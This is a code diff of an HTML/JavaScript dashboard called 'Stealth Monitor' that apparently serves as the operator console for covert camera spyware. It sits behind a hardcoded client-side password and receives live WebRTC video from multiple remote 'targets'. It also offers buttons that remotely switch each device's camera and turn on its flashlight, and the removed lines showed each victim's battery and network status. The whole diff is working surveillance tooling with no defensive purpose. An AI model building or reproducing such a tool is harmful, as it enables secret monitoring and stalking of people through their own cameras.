@@ -3,57 +3,40 @@
 <head>
     <title>Stealth Monitor</title>
     <style>
-        body { background: #111; color: white; font-family: sans-serif; text-align: center; margin: 0; }
-        .monitor-box { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; padding: 20px; }
-        .cam-container { width: 350px; background: #222; border-radius: 12px; padding: 10px; border: 1px solid #444; }
-        video { width: 100%; border-radius: 8px; background: #000; height: 200px; }
-        .info { font-size: 12px; margin: 10px 0; color: #f85606; }
-        .btns { display: flex; gap: 5px; }
-        button { flex: 1; padding: 10px; cursor: pointer; border: none; border-radius: 4px; background: #444; color: white; font-weight: bold; }
-        #login { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; display: flex; align-items: center; justify-content: center; }
+        body{background:#111;color:white;font-family:sans-serif;text-align:center;margin:0;}
+        #box{display:flex;flex-wrap:wrap;justify-content:center;padding:20px;gap:20px;}
+        .card{background:#222;padding:10px;border-radius:10px;border:1px solid #444;width:350px;}
+        video{width:100%;background:#000;border-radius:5px;}
+        button{padding:10px;margin:5px;cursor:pointer;border:none;border-radius:5px;background:#f85606;color:white;font-weight:bold;}
+        #login{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;z-index:99;}
     </style>
 </head>
 <body>
-    <div id="login">
-        <div style="background:#222; padding:30px; border-radius:10px;">
-            <h2>🔒 Login</h2>
-            <input type="password" id="ps" placeholder="Password" style="padding:10px;"><br><br>
-            <button onclick="if(document.getElementById('ps').value=='rony25'){document.getElementById('login').style.display='none';init();}">Enter</button>
-        </div>
-    </div>
-
-    <h2>🛰️ Multi-Target Dashboard</h2>
-    <div id="remote-videos" class="monitor-box"></div>
-
+    <div id="login"><div><h2>🔒 Secure Access</h2><input type="password" id="ps" placeholder="rony25" style="padding:10px;"><br><br><button onclick="if(document.getElementById('ps').value=='rony25'){document.getElementById('login').style.display='none';init();}">Login</button></div></div>
+    <h2>🛰️ Global Monitor</h2>
+    <div id="box"></div>
     <script src="/socket.io/socket.io.js"></script>
     <script>
         let socket, peers = {};
         function init() {
             socket = io();
-            socket.on("offer-front", async (data) => {
-                const { offer, senderId } = data;
-                if (!peers[senderId]) createBox(senderId);
-                await peers[senderId].pc.setRemoteDescription(new RTCSessionDescription(offer));
-                const answer = await peers[senderId].pc.createAnswer();
-                await peers[senderId].pc.setLocalDescription(answer);
-                socket.emit("answer-front", { answer, to: senderId });
+            socket.on("offer", async (d) => {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                peers[d.id] = pc;
+                const card = document.createElement("div"); card.className="card"; card.id="c-"+d.id;
+                card.innerHTML = `<video id="v-${d.id}" autoplay playsinline controls></video><br>
+                    <button onclick="socket.emit('switch','${d.id}')">🔄 Switch</button>
+                    <button onclick="socket.emit('torch','${d.id}')">💡 Light</button>`;
+                document.getElementById("box").appendChild(card);
+                pc.ontrack = e => document.getElementById("v-"+d.id).srcObject = e.streams[0];
+                await pc.setRemoteDescription(new RTCSessionDescription(d.offer));
+                const a = await pc.createAnswer();
+                await pc.setLocalDescription(a);
+                socket.emit("answer", { answer: a, id: d.id });
+                pc.onicecandidate = e => e.candidate && socket.emit("ice", { candidate: e.candidate, id: d.id });
             });
-            socket.on("status-update", d => { if(document.getElementById('stat-'+d.id)) document.getElementById('stat-'+d.id).innerText = `🔋 ${d.battery}% | ${d.network}`; });
-        }
-
-        function createBox(id) {
-            const div = document.createElement("div");
-            div.className = "cam-container"; div.id = "cont-"+id;
-            div.innerHTML = `<video id="vid-${id}" autoplay playsinline></video>
-                <div class="info" id="stat-${id}">Connecting...</div>
-                <div class="btns">
-                    <button onclick="socket.emit('switch-camera', '${id}')" style="background:#0055ff">🔄 Switch</button>
-                    <button onclick="socket.emit('toggle-torch', '${id}')" style="background:#f85606">💡 Light</button>
-                </div>`;
-            document.getElementById("remote-videos").appendChild(div);
-            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-            pc.ontrack = e => document.getElementById("vid-"+id).srcObject = e.streams[0];
-            peers[id] = { pc };
+            socket.on("ice", d => peers[d.id] && peers[d.id].addIceCandidate(new RTCIceCandidate(d.candidate)));
+            socket.on("user-left", id => { document.getElementById("c-"+id)?.remove(); delete peers[id]; });
         }
     </script>
 </body>
